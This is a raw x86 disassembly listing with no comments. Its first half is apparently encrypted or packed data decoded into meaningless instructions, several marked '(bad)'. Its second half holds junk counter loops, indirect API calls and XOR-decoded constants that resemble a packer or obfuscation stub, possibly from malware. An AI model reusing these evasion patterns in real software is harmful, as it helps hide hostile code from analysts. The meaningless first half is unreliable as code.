  41b38b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b38c:	jne    0x41b351
  41b38e:	stc    
  41b38f:	fadd   QWORD PTR [esi-0x5d]
  41b392:	jae    0x41b34e
  41b394:	in     al,0x32
  41b396:	sub    eax,0x67a4b472
  41b39b:	mov    ds:0xacaefbb1,al
  41b3a0:	xor    esp,eax
  41b3a2:	xchg   ecx,eax
  41b3a3:	inc    eax
  41b3a4:	enter  0xc91c,0xfc
  41b3a8:	mov    ecx,0x326f2cab
  41b3ad:	in     al,dx
  41b3ae:	out    0xb8,eax
  41b3b0:	mov    dl,0xd1
  41b3b2:	mov    esi,0x3219849
  41b3b7:	sub    DWORD PTR [ebp+ebp*2+0x1a],esi
  41b3bb:	not    BYTE PTR [edi]
  41b3bd:	xchg   esp,eax
  41b3be:	or     BYTE PTR [edi-0x2c],al
  41b3c1:	das    
  41b3c2:	push   ecx
  41b3c3:	sbb    al,0x0
  41b3c5:	repz jg 0x41b34f
  41b3c8:	fsub   st(2),st
  41b3ca:	shl    DWORD PTR [esi],cl
  41b3cc:	xor    DWORD PTR [eax+edx*8-0x30],esp
  41b3d0:	popf   
  41b3d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3d2:	aaa    
  41b3d3:	lock retf 
  41b3d5:	retf   0xfcba
  41b3d8:	xor    al,0xb7
  41b3da:	call   0x48bf:0x930dcc1e
  41b3e1:	cdq    
  41b3e2:	push   eax
  41b3e3:	stc    
  41b3e4:	pop    esi
  41b3e5:	shr    eax,cl
  41b3e7:	fcmovnb st,st(3)
  41b3e9:	push   ds
  41b3ea:	jbe    0x41b44f
  41b3ec:	arpl   WORD PTR [edx+ebp*8-0x6b],bp
  41b3f0:	push   ebx
  41b3f1:	cli    
  41b3f2:	(bad)  
  41b3f3:	test   DWORD PTR [edx-0x7d0be0b],0xf770b2d8
  41b3fd:	stos   BYTE PTR es:[edi],al
  41b3fe:	test   esp,ebp
  41b400:	(bad)  
  41b401:	sub    al,0xa1
  41b403:	push   0x97322c3d
  41b408:	add    edx,DWORD PTR [esi+0x1c2cdc3d]
  41b40e:	int    0x58
  41b410:	xchg   DWORD PTR [ebx+eax*2+0x164b5d59],ebx
  41b417:	mov    ds:0x6afd4641,eax
  41b41c:	pop    ebx
  41b41d:	sbb    al,0x12
  41b41f:	and    bl,cl
  41b421:	or     BYTE PTR [ebx+0x6fc2638e],0xc1
  41b428:	and    ch,BYTE PTR [edx-0x58]
  41b42b:	jle    0x41b3b4
  41b42d:	out    dx,al
  41b42e:	jl     0x41b3b9
  41b430:	pushf  
  41b431:	stos   DWORD PTR es:[edi],eax
  41b432:	das    
  41b433:	adc    ch,ah
  41b435:	in     eax,dx
  41b436:	mov    edx,0x8d8a8a42
  41b43b:	ja     0x41b3ea
  41b43d:	push   es
  41b43e:	push   eax
  41b43f:	xchg   ebp,eax
  41b440:	lods   al,BYTE PTR ds:[esi]
  41b441:	jmp    0xecc4adb3
  41b446:	or     bh,BYTE PTR [ebp-0xc]
  41b449:	daa    
  41b44a:	arpl   WORD PTR [edx-0x2d],dx
  41b44d:	call   0x62e:0x8ee3d07a
  41b454:	enter  0x9886,0x9a
  41b458:	ja     0x41b488
  41b45a:	fs jmp 0x41b4c4
  41b45d:	add    BYTE PTR [ecx],ch
  41b45f:	sbb    eax,0x852e7e4c
  41b464:	inc    ebx
  41b465:	lods   eax,DWORD PTR ds:[esi]
  41b466:	mov    ebp,0x1a462f3d
  41b46b:	ins    DWORD PTR es:[edi],dx
  41b46c:	xor    eax,0xf2688a41
  41b471:	pop    ss
  41b472:	xlat   BYTE PTR ds:[ebx]
  41b473:	mov    esi,0x711c1ebb
  41b478:	xor    ch,bh
  41b47a:	cmp    BYTE PTR [edx],ch
  41b47c:	js     0x41b4bc
  41b47e:	popa   
  41b47f:	outs   dx,DWORD PTR ds:[esi]
  41b480:	test   al,0xc2
  41b482:	outs   dx,DWORD PTR ds:[esi]
  41b483:	dec    eax
  41b484:	loopne 0x41b4b5
  41b486:	fidiv  DWORD PTR [eax+0x63]
  41b489:	inc    eax
  41b48a:	popa   
  41b48b:	outs   dx,BYTE PTR ds:[esi]
  41b48c:	outs   dx,BYTE PTR ds:[esi]
  41b48d:	outs   dx,BYTE PTR ds:[esi]
  41b48e:	imul   esp,DWORD PTR [ebx+esi*8-0x19904b36],0x0
  41b496:	and    esi,esi
  41b498:	sub    dh,0x59
  41b49b:	idiv   ebx
  41b49d:	outs   dx,DWORD PTR ds:[esi]
  41b49e:	xchg   esi,eax
  41b49f:	inc    ebp
  41b4a0:	pop    esi
  41b4a1:	mov    bh,0xe6
  41b4a3:	nop
  41b4a4:	pop    es
  41b4a5:	pop    eax
  41b4a6:	(bad)  
  41b4a7:	mov    ds:0xbb577467,al
  41b4ac:	push   esp
  41b4ad:	repz (bad) 
  41b4af:	lock clc 
  41b4b1:	dec    ecx
  41b4b2:	out    dx,eax
  41b4b3:	xor    DWORD PTR [edi+0x7612de14],ebx
  41b4b9:	jge    0x41b471
  41b4bb:	pop    es
  41b4bc:	mov    ch,0x1a
  41b4be:	sbb    DWORD PTR [edi+0x4c],esp
  41b4c1:	int3   
  41b4c2:	leave  
  41b4c3:	int3   
  41b4c4:	imul   ebx,eax,0xffffffb5
  41b4c7:	ret    0xfc5f
  41b4ca:	retf   0x4ea
  41b4cd:	add    cl,bh
  41b4cf:	pop    ss
  41b4d0:	out    0x4,al
  41b4d2:	sbb    bh,dh
  41b4d4:	pusha  
  41b4d5:	ja     0x41b4e9
  41b4d7:	(bad)  ds:0x9981239f
  41b4dd:	imul   DWORD PTR [eax+0x3352b556]
  41b4e3:	dec    edx
  41b4e4:	dec    ebx
  41b4e5:	out    0xa1,eax
  41b4e7:	gs cs repz jb 0x41b4d2
  41b4ec:	push   edi
  41b4ed:	fst    st(3)
  41b4ef:	es out dx,al
  41b4f1:	sub    BYTE PTR [esp+eax*4-0x78702bcf],0x35
  41b4f9:	and    DWORD PTR [ecx],0x35e8b76e
  41b4ff:	push   esi
  41b500:	xlat   BYTE PTR ds:[ebx]
  41b501:	les    esp,FWORD PTR ds:0x45b67adc
  41b507:	int    0xc9
  41b509:	mov    bh,0x21
  41b50b:	inc    ebp
  41b50c:	add    ebx,ecx
  41b50e:	jp     0x41b537
  41b510:	aaa    
  41b511:	sub    al,0x4d
  41b513:	dec    eax
  41b514:	push   esp
  41b515:	stos   DWORD PTR es:[edi],eax
  41b516:	mov    ds:0xcad9c0dd,eax
  41b51b:	sub    al,0x8d
  41b51d:	mov    WORD PTR [ebx+esi*4+0x6960c1d5],ds
  41b524:	push   ds
  41b525:	stos   BYTE PTR es:[edi],al
  41b526:	loope  0x41b52e
  41b528:	enter  0x988a,0xf0
  41b52c:	adc    eax,0x4ff36528
  41b531:	mov    al,ds:0x8e86dc44
  41b536:	or     DWORD PTR [eax],ecx
  41b538:	push   edi
  41b539:	jnp    0x41b50e
  41b53b:	mov    WORD PTR [edx+edx*1],?
  41b53e:	dec    esi
  41b53f:	jge    0x41b5be
  41b541:	test   edx,ebx
  41b543:	cmp    BYTE PTR [esp+ebp*4],dl
  41b546:	sahf   
  41b547:	mov    DWORD PTR [ecx],0x1ae5918c
  41b54d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b54e:	add    BYTE PTR [eax+0x52f0d5c6],al
  41b554:	sub    eax,0x79448344
  41b559:	mov    esp,0x7b049ada
  41b55e:	fwait
  41b55f:	lods   al,BYTE PTR ds:[esi]
  41b560:	imul   ebp,DWORD PTR [eax],0xffffffb4
  41b563:	or     eax,0xcbcf8997
  41b568:	lds    eax,FWORD PTR [esi+0x73]
  41b56b:	xchg   edi,eax
  41b56c:	call   0xfcffe8a3
  41b571:	(bad)  
  41b573:	sub    BYTE PTR [edi-0x6a],0xad
  41b577:	les    edi,FWORD PTR [edx+0x2cfb38e1]
  41b57d:	cmpxchg ecx,edi
  41b580:	xchg   edi,eax
  41b581:	lods   al,BYTE PTR ds:[esi]
  41b582:	clc    
  41b583:	das    
  41b584:	outs   dx,BYTE PTR ds:[esi]
  41b585:	lock adc DWORD PTR [edx+0x6d],esp
  41b589:	jge    0x41b5dc
  41b58b:	mov    ecx,0x9aefd39a
  41b590:	mov    WORD PTR [edi-0x80],fs
  41b593:	in     al,dx
  41b594:	bound  ebp,QWORD PTR ds:0xb1119c7a
  41b59a:	cmp    esp,DWORD PTR [ecx]
  41b59c:	arpl   WORD PTR [eax+esi*2],bp
  41b59f:	pop    eax
  41b5a0:	into   
  41b5a1:	cwde   
  41b5a2:	(bad)  
  41b5a3:	daa    
  41b5a4:	retf   0x72a0
  41b5a7:	xchg   bh,bh
  41b5a9:	mov    ds:0xa180f9d0,eax
  41b5ae:	and    cl,ah
  41b5b0:	inc    ebp
  41b5b1:	dec    edx
  41b5b2:	inc    edx
  41b5b3:	mov    esp,0x3e571a76
  41b5b8:	sbb    eax,0xd72d1f02
  41b5bd:	fs cld 
  41b5bf:	out    0x26,eax
  41b5c1:	pop    ebx
  41b5c2:	nop
  41b5c3:	cmp    al,0xa9
  41b5c5:	loope  0x41b595
  41b5c7:	mov    eax,ds:0x34e498c0
  41b5cc:	dec    ebp
  41b5cd:	int3   
  41b5ce:	outs   dx,DWORD PTR ds:[esi]
  41b5cf:	call   0xa621:0x423a8690
  41b5d6:	cmp    DWORD PTR [ebx-0x2a],ecx
  41b5d9:	int    0xab
  41b5db:	jo     0x41b5cb
  41b5dd:	leave  
  41b5de:	sub    al,dh
  41b5e0:	pop    eax
  41b5e1:	clc    
  41b5e2:	sbb    ecx,DWORD PTR [ecx]
  41b5e4:	add    eax,0x9b13c29d
  41b5e9:	cld    
  41b5ea:	xchg   ebx,eax
  41b5eb:	lods   eax,DWORD PTR ds:[esi]
  41b5ec:	or     BYTE PTR [ecx+0x3f],al
  41b5ef:	jg     0x41b5cb
  41b5f1:	sbb    al,0x5c
  41b5f3:	les    esi,FWORD PTR [esi-0x2f]
  41b5f6:	test   BYTE PTR [edi],dl
  41b5f8:	inc    edi
  41b5f9:	mov    BYTE PTR [ecx+0x41e404bf],ch
  41b5ff:	or     BYTE PTR [ebx-0x19],dl
  41b602:	and    bh,bh
  41b604:	or     DWORD PTR [edi+0x6],esp
  41b607:	out    dx,al
  41b608:	or     bl,al
  41b60a:	push   eax
  41b60b:	xor    BYTE PTR [eax-0x52b9ceac],bh
  41b611:	mov    al,0x70
  41b613:	lock xchg DWORD PTR [ecx-0x8ce4f2b],edx
  41b61a:	cmp    al,0xd6
  41b61c:	aas    
  41b61d:	outs   dx,BYTE PTR ds:[esi]
  41b61e:	xor    ch,ah
  41b620:	mov    ah,cl
  41b622:	push   edx
  41b623:	push   eax
  41b624:	jle    0x41b68a
  41b626:	repnz push eax
  41b628:	pop    ebx
  41b629:	jge    0x41b614
  41b62b:	xor    DWORD PTR [eax+0x3b],ebx
  41b62e:	dec    edi
  41b62f:	ins    BYTE PTR es:[edi],dx
  41b630:	fisttp WORD PTR [esi-0x3c03f16f]
  41b636:	pop    ebp
  41b637:	sbb    eax,0x9c8e639d
  41b63c:	cwde   
  41b63d:	xchg   DWORD PTR ds:0x9843b284,esi
  41b643:	add    edx,DWORD PTR [esi+ecx*4+0x50]
  41b647:	sbb    eax,0x580682c8
  41b64c:	jnp    0x41b5f9
  41b64e:	div    al
  41b650:	fisttp DWORD PTR ds:0x8a4babc4
  41b656:	stos   DWORD PTR es:[edi],eax
  41b657:	int3   
  41b658:	jne    0x41b633
  41b65a:	test   DWORD PTR [edi+0x35e7ca9],ecx
  41b660:	mov    ecx,0xad6e68e3
  41b665:	dec    edi
  41b666:	lods   eax,DWORD PTR ds:[esi]
  41b667:	cmp    al,0x6a
  41b669:	fst    DWORD PTR [edi+0x2a]
  41b66c:	sub    ebp,eax
  41b66e:	jmp    0x5a589a10
  41b673:	cmp    al,0xbd
  41b675:	pop    ecx
  41b676:	xchg   ebp,eax
  41b677:	inc    esp
  41b678:	(bad)  
  41b679:	push   ebx
  41b67a:	jmp    0x7085:0x43af430a
  41b681:	clc    
  41b682:	mov    WORD PTR ds:[ebp-0x2df8b2c8],fs
  41b689:	sub    BYTE PTR [ecx+0x78f4ca2c],al
  41b68f:	addr16 mov ch,0xb6
  41b692:	dec    ecx
  41b693:	xchg   esp,eax
  41b694:	xchg   ebx,eax
  41b695:	test   eax,0xa10fccd0
  41b69a:	and    edi,edx
  41b69c:	add    eax,0xe18328e6
  41b6a1:	jle    0x41b689
  41b6a3:	fistp  QWORD PTR [edi-0x11c4ea30]
  41b6a9:	adc    al,BYTE PTR [ecx-0x650404e6]
  41b6af:	ins    DWORD PTR es:[edi],dx
  41b6b0:	mov    al,0xdb
  41b6b2:	leave  
  41b6b3:	scas   al,BYTE PTR es:[edi]
  41b6b4:	push   edi
  41b6b5:	fs (bad) 
  41b6b7:	add    dh,ch
  41b6b9:	aam    0x12
  41b6bb:	das    
  41b6bc:	inc    esp
  41b6bd:	call   0x779c:0x67122b6c
  41b6c4:	sbb    DWORD PTR [esi+0x4e],0xffffffce
  41b6c8:	sbb    al,0xd3
  41b6ca:	pmaxub mm0,QWORD PTR ds:0xf0a5fea0
  41b6d1:	cmp    BYTE PTR [ebx-0x3f],dl
  41b6d4:	ror    BYTE PTR [edx],1
  41b6d6:	in     al,0xea
  41b6d8:	retf   0xb6df
  41b6db:	sbb    eax,0x7c2a233d
  41b6e0:	mov    ds:0x45987c28,eax
  41b6e5:	cld    
  41b6e6:	fucomip st,st(5)
  41b6e8:	mov    edx,0x3b06120f
  41b6ed:	test   DWORD PTR [ebx],esp
  41b6ef:	pop    ebp
  41b6f0:	pop    ebx
  41b6f1:	pusha  
  41b6f2:	int    0x8f
  41b6f4:	mov    ecx,ebp
  41b6f6:	push   esi
  41b6f7:	inc    esi
  41b6f8:	ins    DWORD PTR es:[edi],dx
  41b6f9:	mov    ebp,0xd6674941
  41b6fe:	or     DWORD PTR [eax],edi
  41b700:	jnp    0x41b778
  41b702:	clc    
  41b703:	mov    BYTE PTR [ecx+esi*8-0x77a14d01],dh
  41b70a:	sar    BYTE PTR [ebp+eiz*2-0x4d],1
  41b70e:	lods   al,BYTE PTR ds:[esi]
  41b70f:	int3   
  41b710:	cmp    eax,0x8a60f458
  41b715:	test   al,0x9b
  41b717:	inc    ecx
  41b718:	jge    0x41b6f4
  41b71a:	in     al,dx
  41b71b:	adc    al,0x6e
  41b71d:	mov    DWORD PTR [ecx+0x1d],ecx
  41b720:	jno    0x41b6a8
  41b722:	dec    ebp
  41b723:	test   DWORD PTR [edi-0x1b],edx
  41b726:	mov    al,ds:0xae655de9
  41b72b:	int3   
  41b72c:	xchg   ecx,eax
  41b72d:	stc    
  41b72e:	popa   
  41b72f:	data16 shr BYTE PTR [ecx],1
  41b732:	stos   DWORD PTR es:[edi],eax
  41b733:	dec    esp
  41b734:	push   ebp
  41b735:	and    ebx,edx
  41b737:	and    al,0x2f
  41b73a:	jo     0x41b6c5
  41b73c:	dec    ebp
  41b73d:	in     al,dx
  41b73e:	mov    ecx,DWORD PTR [ebp-0x14]
  41b741:	mov    ecx,DWORD PTR [ecx+0xc]
  41b744:	movsx  cx,BYTE PTR [ecx+eax*1]
  41b749:	mov    edx,0x3b4b
  41b74e:	sub    cx,dx
  41b751:	mov    edx,0x8a85
  41b756:	xor    cx,dx
  41b759:	mov    edx,0x4f85
  41b75e:	cmp    cx,dx
  41b761:	jne    0x419376
  41b767:	mov    ecx,DWORD PTR ds:0x423f7f
  41b76d:	mov    ecx,DWORD PTR [ecx+0x198]
  41b773:	mov    DWORD PTR [ecx],eax
  41b775:	jmp    0x41b79b
  41b77a:	mov    ecx,DWORD PTR [ebp+0x18]
  41b77d:	cmp    ecx,0xf89c85b5
  41b783:	jne    0x41b79b
  41b789:	push   eax
  41b78a:	push   DWORD PTR [ebp+0x14]
  41b78d:	push   DWORD PTR [ebp+0x10]
  41b790:	push   DWORD PTR [ebp+0xc]
  41b793:	push   DWORD PTR [ebp+0x8]
  41b796:	call   0x416ab7
  41b79b:	pop    edi
  41b79c:	pop    esi
  41b79d:	leave  
  41b79e:	ret    0x14
  41b7a1:	push   ebp
  41b7a2:	mov    ebp,esp
  41b7a4:	sub    esp,0x48
  41b7a7:	push   ebx
  41b7a8:	movzx  eax,BYTE PTR ds:0x42901c
  41b7af:	sub    DWORD PTR ds:0x429010,eax
  41b7b5:	push   esi
  41b7b6:	adc    DWORD PTR ds:0x429000,0x3a05
  41b7c0:	push   edi
  41b7c1:	xor    edi,0x559a
  41b7c7:	xor    esi,esi
  41b7c9:	mov    DWORD PTR [ebp-0x20],esi
  41b7cc:	sub    eax,0x6d46
  41b7d1:	mov    eax,DWORD PTR [ebp-0xc]
  41b7d4:	push   0x5
  41b7d6:	and    DWORD PTR ds:0x42b010,0x0
  41b7e0:	mov    edi,DWORD PTR ds:0x42b010
  41b7e6:	inc    edi
  41b7e7:	mov    DWORD PTR ds:0x42b010,edi
  41b7ed:	cmp    DWORD PTR ds:0x42b010,0x1e
  41b7f4:	jne    0x41b80f
  41b7fa:	push   0x4aeb
  41b7ff:	push   0x362c
  41b804:	push   0x611c
  41b809:	call   DWORD PTR ds:0x425044
  41b80f:	cmp    DWORD PTR ds:0x42b010,0x11
  41b816:	jb     0x41b7e0
  41b81c:	and    DWORD PTR ds:0x429020,0x0
  41b826:	jmp    0x41b838
  41b82b:	mov    edi,DWORD PTR ds:0x429020
  41b831:	inc    edi
  41b832:	mov    DWORD PTR ds:0x429020,edi
  41b838:	cmp    DWORD PTR ds:0x429020,0x1b
  41b83f:	jae    0x41b8d2
  41b845:	cmp    DWORD PTR ds:0x429020,0x5
  41b84c:	jne    0x41b86a
  41b852:	push   0x6d5d
  41b857:	push   0x6bd3
  41b85c:	push   0x2a83
  41b861:	push   DWORD PTR [ebp-0x20]
  41b864:	call   DWORD PTR ds:0x425048
  41b86a:	cmp    DWORD PTR ds:0x429020,0x4
  41b871:	jne    0x41b884
  41b877:	mov    edi,DWORD PTR ds:0x429020
  41b87d:	inc    edi
  41b87e:	mov    DWORD PTR ds:0x429020,edi
  41b884:	jmp    0x41b82b
  41b889:	mov    DWORD PTR ds:0x42901c,0x1a
  41b893:	cmp    DWORD PTR ds:0x42901c,0x0
  41b89a:	je     0x41b8d2
  41b8a0:	cmp    DWORD PTR ds:0x42901c,0x29
  41b8a7:	jne    0x41b8b8
  41b8ad:	push   0x3b9c
  41b8b2:	call   DWORD PTR ds:0x42504c
  41b8b8:	xor    edi,edi
  41b8ba:	or     edi,DWORD PTR ds:0x42901c
  41b8c0:	dec    edi
  41b8c1:	mov    DWORD PTR ds:0x42901c,edi
  41b8c7:	jmp    0x41b893
  41b8cc:	sub    DWORD PTR ds:0x429008,ecx
  41b8d2:	mov    DWORD PTR [ebp-0xc],eax
  41b8d5:	and    DWORD PTR ds:0x42d01c,0x0
  41b8df:	mov    edi,DWORD PTR ds:0x42d01c
  41b8e5:	inc    edi
  41b8e6:	mov    DWORD PTR ds:0x42d01c,edi
  41b8ec:	cmp    DWORD PTR ds:0x42d01c,0x13
  41b8f3:	jne    0x41b909
  41b8f9:	push   0x8e10
  41b8fe:	push   0x424489
  41b903:	call   DWORD PTR ds:0x425010
  41b909:	cmp    DWORD PTR ds:0x42d01c,0x11
  41b910:	jb     0x41b8df
  41b916:	pop    edi
  41b917:	push   0x424093
  41b91c:	sub    DWORD PTR ds:0x42a018,0x42b000
  41b926:	call   DWORD PTR ds:0x425024
  41b92c:	adc    DWORD PTR ds:0x42c014,0x59ac
  41b936:	push   esi
  41b937:	xor    DWORD PTR ds:0x42d018,0x57bc
  41b941:	push   0x2
  41b943:	add    DWORD PTR ds:0x42a014,0x11b6
  41b94d:	push   0x1
  41b94f:	push   0x2
  41b951:	and    DWORD PTR ds:0x42d004,0x42a01c
  41b95b:	push   0x1
  41b95d:	and    DWORD PTR ds:0x42a004,0x42b014
  41b967:	push   0x8678768
  41b96c:	sbb    DWORD PTR ds:0x42901c,0x42c014
  41b976:	push   0x87676776
  41b97b:	sub    DWORD PTR ds:0x42a008,0x42c014
  41b985:	call   DWORD PTR ds:0x425000
  41b98b:	push   esi
  41b98c:	push   0x68
  41b98e:	push   0xd
  41b990:	push   0x5
  41b992:	push   0x3
  41b994:	push   0x5468787
  41b999:	sub    DWORD PTR ds:0x429014,0x2577
  41b9a3:	call   DWORD PTR ds:0x425008
  41b9a9:	xor    DWORD PTR ds:0x42c00c,0x43e8
  41b9b3:	dec    edi
  41b9b4:	mov    DWORD PTR ds:0x42d008,0x724a
  41b9be:	jne    0x41b917
  41b9c4:	push   0x4240a7
  41b9c9:	push   esi
  41b9ca:	push   esi
  41b9cb:	call   DWORD PTR ds:0x425038
  41b9d1:	or     DWORD PTR ds:0x42b004,0x42b00c
  41b9db:	test   eax,eax
  41b9dd:	je     0x41ba3c
  41b9e3:	add    DWORD PTR ds:0x429008,edx
  41b9e9:	mov    eax,ds:0x75687681
  41b9ee:	and    DWORD PTR ds:0x429024,0x0
  41b9f8:	mov    ebx,DWORD PTR ds:0x429024
  41b9fe:	inc    ebx
  41b9ff:	mov    DWORD PTR ds:0x429024,ebx
  41ba05:	cmp    DWORD PTR ds:0x429024,0x24
  41ba0c:	jne    0x41ba1e
  41ba12:	push   DWORD PTR [ebp-0x24]
  41ba15:	push   DWORD PTR [ebp-0x18]
  41ba18:	call   DWORD PTR ds:0x425018
  41ba1e:	cmp    DWORD PTR ds:0x429024,0x1e
  41ba25:	jb     0x41b9f8
  41ba2b:	add    DWORD PTR ds:0x42d000,ebx
  41ba31:	imul   eax,eax,0x5463da19
  41ba37:	mov    ds:0x75687681,eax
  41ba3c:	not    eax
  41ba3e:	mov    eax,DWORD PTR [ebp-0xc]
  41ba41:	mov    ebx,DWORD PTR ds:0x42b010
  41ba47:	mov    ebx,0xf89c85b6
  41ba4c:	cmp    eax,ebx
  41ba4e:	mov    DWORD PTR ds:0x42d01c,0x2eca
  41ba58:	jne    0x41baa0
  41ba5e:	add    DWORD PTR ds:0x429018,0x42a018
  41ba68:	mov    DWORD PTR ds:0x42408f,0xf89c85b5
  41ba72:	or     DWORD PTR ds:0x42b01c,0x42c010
  41ba7c:	push   DWORD PTR [ebp+0x10]
  41ba7f:	push   DWORD PTR [ebp+0xc]
  41ba82:	push   DWORD PTR [ebp+0x8]
  41ba85:	call   0x408413
  41ba8a:	adc    edi,edi
  41ba8c:	mov    ecx,DWORD PTR ds:0x423f7f
  41ba92:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ba98:	sbb    esi,0x7064
  41ba9e:	mov    DWORD PTR [ecx],eax
  41baa0:	mov    DWORD PTR [ebp-0x4],ebx
  41baa3:	add    esi,0x7033
  41baa9:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bab0:	and    DWORD PTR ds:0x42d000,0x0
  41baba:	jmp    0x41bace
  41babf:	xor    ecx,ecx
  41bac1:	add    ecx,DWORD PTR ds:0x42d000
  41bac7:	inc    ecx
  41bac8:	mov    DWORD PTR ds:0x42d000,ecx
  41bace:	cmp    DWORD PTR ds:0x42d000,0x1d
  41bad5:	jae    0x41bb24
  41badb:	cmp    DWORD PTR ds:0x42d000,0x9
  41bae2:	jne    0x41bafb
  41bae8:	push   0x42b01c
  41baed:	push   DWORD PTR [ebp-0x1c]
  41baf0:	push   0x424395
  41baf5:	call   DWORD PTR ds:0x42501c
  41bafb:	cmp    DWORD PTR ds:0x42d000,0x8
  41bb02:	jne    0x41bb15
  41bb08:	mov    ecx,DWORD PTR ds:0x42d000
  41bb0e:	inc    ecx
  41bb0f:	mov    DWORD PTR ds:0x42d000,ecx
  41bb15:	jmp    0x41babf
  41bb1a:	mov    DWORD PTR ds:0x42a01c,0x231b
  41bb24:	lea    eax,[ebp-0x28]
  41bb27:	and    DWORD PTR ds:0x42c008,0x0
  41bb31:	mov    edi,DWORD PTR ds:0x42c008
  41bb37:	inc    edi
  41bb38:	mov    DWORD PTR ds:0x42c008,edi
  41bb3e:	cmp    DWORD PTR ds:0x42c008,0x17
  41bb45:	jne    0x41bb59
  41bb4b:	push   0x42a00c
  41bb50:	push   DWORD PTR [ebp-0x18]
  41bb53:	call   DWORD PTR ds:0x425020
  41bb59:	cmp    DWORD PTR ds:0x42c008,0x10
  41bb60:	jb     0x41bb31
  41bb66:	and    DWORD PTR ds:0x42900c,0x0
  41bb70:	jmp    0x41bb84
  41bb75:	xor    ecx,ecx
  41bb77:	or     ecx,DWORD PTR ds:0x42900c
  41bb7d:	inc    ecx
  41bb7e:	mov    DWORD PTR ds:0x42900c,ecx
  41bb84:	cmp    DWORD PTR ds:0x42900c,0x1b
  41bb8b:	jae    0x41bc1f
  41bb91:	cmp    DWORD PTR ds:0x42900c,0x20
  41bb98:	jne    0x41bba7
  41bb9e:	push   DWORD PTR [ebp-0x14]
  41bba1:	call   DWORD PTR ds:0x425028
  41bba7:	jmp    0x41bb75
  41bbac:	mov    DWORD PTR ds:0x42b00c,0x15
  41bbb6:	cmp    DWORD PTR ds:0x42b00c,0x0
  41bbbd:	je     0x41bc1f
  41bbc3:	cmp    DWORD PTR ds:0x42b00c,0x4
  41bbca:	jne    0x41bbf1
  41bbd0:	push   0x6080
  41bbd5:	push   DWORD PTR [ebp-0x20]
  41bbd8:	push   0x42d004
  41bbdd:	push   0x710d
  41bbe2:	push   DWORD PTR [ebp-0x10]
  41bbe5:	push   DWORD PTR [ebp-0x14]
  41bbe8:	push   DWORD PTR [ebp-0x24]
  41bbeb:	call   DWORD PTR ds:0x42502c
  41bbf1:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bbf8:	jne    0x41bc0d
  41bbfe:	xor    edi,edi
  41bc00:	add    edi,DWORD PTR ds:0x42b00c
  41bc06:	dec    edi
  41bc07:	mov    DWORD PTR ds:0x42b00c,edi
  41bc0d:	mov    edi,DWORD PTR ds:0x42b00c
  41bc13:	dec    edi
  41bc14:	mov    DWORD PTR ds:0x42b00c,edi
  41bc1a:	jmp    0x41bbb6
  41bc1f:	mov    DWORD PTR [ebp-0x20],eax
  41bc22:	movzx  ecx,BYTE PTR ds:0x429028
  41bc29:	xor    ecx,DWORD PTR ds:0x42c00c
  41bc2f:	mov    DWORD PTR ds:0x429028,ecx
  41bc35:	lea    eax,[ebp-0x2c]
  41bc38:	and    DWORD PTR ds:0x429004,0x0
  41bc42:	jmp    0x41bc54
  41bc47:	mov    esi,DWORD PTR ds:0x429004
  41bc4d:	inc    esi
  41bc4e:	mov    DWORD PTR ds:0x429004,esi
  41bc54:	cmp    DWORD PTR ds:0x429004,0x1e
  41bc5b:	jae    0x41bcfb
  41bc61:	cmp    DWORD PTR ds:0x429004,0x7
  41bc68:	jne    0x41bc79
  41bc6e:	push   0x5e54
  41bc73:	call   DWORD PTR ds:0x425030
  41bc79:	cmp    DWORD PTR ds:0x429004,0x6
  41bc80:	jne    0x41bc95
  41bc86:	xor    esi,esi
  41bc88:	xor    esi,DWORD PTR ds:0x429004
  41bc8e:	inc    esi
  41bc8f:	mov    DWORD PTR ds:0x429004,esi
  41bc95:	jmp    0x41bc47
  41bc9a:	and    DWORD PTR ds:0x42b00c,0x0
  41bca4:	jmp    0x41bcb6
  41bca9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcaf:	inc    esi
  41bcb0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcb6:	cmp    DWORD PTR ds:0x42b00c,0x12
  41bcbd:	jae    0x41bcfb
  41bcc3:	cmp    DWORD PTR ds:0x42b00c,0xc
  41bcca:	jne    0x41bcdc
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	push   DWORD PTR [ebp-0x28]
  41bcd6:	call   DWORD PTR ds:0x425034
  41bcdc:	cmp    DWORD PTR ds:0x42b00c,0xb
  41bce3:	jne    0x41bcf6
  41bce9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcef:	inc    esi
  41bcf0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcf6:	jmp    0x41bca9
  41bcfb:	mov    DWORD PTR [ebp-0x1c],eax
  41bcfe:	mov    eax,ds:0x423f7f
  41bd03:	mov    eax,DWORD PTR [eax+0x1c8]
  41bd09:	mov    eax,DWORD PTR [eax]
  41bd0b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bd0e:	mov    esi,0x7510893
  41bd13:	xor    eax,esi
  41bd15:	mov    edi,0x3272db
  41bd1a:	add    eax,edi
  41bd1c:	mov    DWORD PTR [ecx],eax
  41bd1e:	mov    eax,ds:0x42418f
  41bd23:	cmp    eax,0x301ac8f5
  41bd28:	jne    0x41bd4f
  41bd2e:	mov    eax,DWORD PTR [ebp-0x4]
  41bd31:	mov    ecx,DWORD PTR ds:0x423f7f
  41bd37:	mov    ecx,DWORD PTR [ecx+0x198]
  41bd3d:	xor    eax,esi
  41bd3f:	add    eax,edi
  41bd41:	mov    DWORD PTR [ecx],eax
  41bd43:	mov    eax,DWORD PTR [ebp-0x4]
  41bd46:	xor    eax,esi
  41bd48:	add    eax,edi
  41bd4a:	mov    ds:0x42418f,eax
  41bd4f:	mov    eax,ds:0x423f7f
  41bd54:	mov    eax,DWORD PTR [eax+0x18c]
  41bd5a:	mov    eax,DWORD PTR [eax]
  41bd5c:	mov    DWORD PTR [ebp-0x30],eax
  41bd5f:	mov    eax,0xf89c85ba
  41bd64:	mov    DWORD PTR [ebp-0x1c],eax
  41bd67:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6a:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6d:	mov    DWORD PTR [ebp-0x1c],ebx
  41bd70:	mov    DWORD PTR [ebp-0x38],eax
  41bd73:	mov    DWORD PTR [ebp-0x38],0xf89c85be
